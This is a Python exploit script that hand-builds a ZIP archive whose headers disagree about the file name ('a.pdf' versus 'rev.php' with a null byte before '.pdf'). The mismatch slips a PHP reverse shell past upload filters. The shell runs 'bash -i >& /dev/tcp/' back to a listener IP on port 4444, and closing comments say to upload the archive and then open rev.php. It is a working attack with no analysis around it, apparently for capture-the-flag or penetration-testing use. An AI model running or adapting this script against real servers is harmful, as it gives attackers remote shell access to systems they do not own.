import zlib
from struct import pack
import requests

filename = b'a.pdf'
#filename = b'rev.php\x00.pdf'
filename2 = b'rev.php\x00.pdf'
revip = '' # reverse listener ip
targetip = '' # target machine ip
revshell = b"""<?php system("bash -c 'bash -i >& /dev/tcp/"""+revip.encode()+b"""/4444 0>&1'"); ?>"""

length = len(revshell)
crc = zlib.crc32(revshell)

# Local file header
lfh = b''
lfh += b'\x50\x4b\x03\x04' # magic bytes
lfh += b'\x14\x00' # Version needed to extract (minimum)
lfh += b'\x00\x00' # General purpose bit flag
lfh += b'\x00\x00' # Compression method; e.g. none = 0, DEFLATE = 8 (or "\0x08\0x00")
lfh += b'\x55\x55' # File last modification time
lfh += b'\x55\x55' # File last modification date
lfh += pack("<L", crc) # CRC-32 of uncompressed data
lfh += pack("<L", length) # Compressed size
lfh += pack("<L", length) # Uncompressed size
lfh += pack("<H", len(filename))
lfh += b'\x00\x00' # Extra field length
lfh += filename
lfh += revshell

# central directory
cd = b''
cd += b'\x50\x4b\x01\x02' # magic bytes
cd += b'\x14\x03' # Version made by
cd += b'\x14\x00' # version needed to extract
cd += b'\x00\x00' # General purpose bit flag
cd += b'\x00\x00' # compression method
cd += b'\x55\x55' # File last modification time
cd += b'\x55\x55' # File last modification date
cd += pack("<L", crc) # CRC-32 of uncompressed data
cd += pack("<L", length) # Compressed size
cd += pack("<L", length) # Uncompressed size
cd += pack("<H", len(filename2))
cd += b'\x00\x00' # Extra field length
cd += b'\x00\x00' # File comment length
cd += b'\x00\x00' # Disk number where file starts
cd += b'\x00\x00' # Internal file attributes
cd += b'\x00\x00\xA4\x81' # External file attributes
cd += b'\x00\x00\x00\x00' # Relative offset of local file header
cd += filename2

# End of central directory record
eocd = b''
eocd += b'\x50\x4b\x05\x06' # magic bytes
eocd += b'\x00\x00' # Number of this disk 
eocd += b'\x00\x00' # Disk where central directory starts
eocd += b'\x01\x00' # Number of central directory records on this disk
eocd += b'\x01\x00' # Total number of central directory records
eocd += pack("<L", len(cd)) # Size of central directory (bytes) 
eocd += pack("<L", len(lfh)) # Offset of start of central directory, relative to start of archive 
eocd += b'\x00\x00' # Comment length


zip_content = lfh+cd+eocd
f = open("rev.zip", "wb")
f.write(zip_content)
f.close()
# upload rev.zip
# access rev.php
